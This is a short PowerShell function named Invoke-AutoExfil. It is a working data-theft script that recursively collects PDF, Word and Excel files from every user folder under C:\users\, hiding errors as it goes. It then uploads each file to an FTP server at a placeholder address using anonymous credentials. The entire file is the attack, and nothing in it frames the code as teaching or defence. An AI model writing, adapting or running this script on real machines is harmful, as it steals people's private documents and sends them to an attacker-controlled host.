function Invoke-AutoExfil
{
    $steal = ".pdf", ".doc", ".docx", ".xls"

    $files = Get-ChildItem -Force -Recurse -Path C:\users\ -ErrorAction SilentlyContinue | Where {$_.Extension -in $steal} | Select name,fullname

    $server = "ftp://SERVERIP/"
    $webclient = New-Object System.Net.WebClient
    $webclient.Credentials = New-Object System.Net.NetworkCredential("anonymous","anonymous")

    foreach ($f in $files) {
	    $uri = New-Object System.Uri($server+$f.Name)
	    $webclient.UploadFIle($uri, $f.Fullname)
    }
}
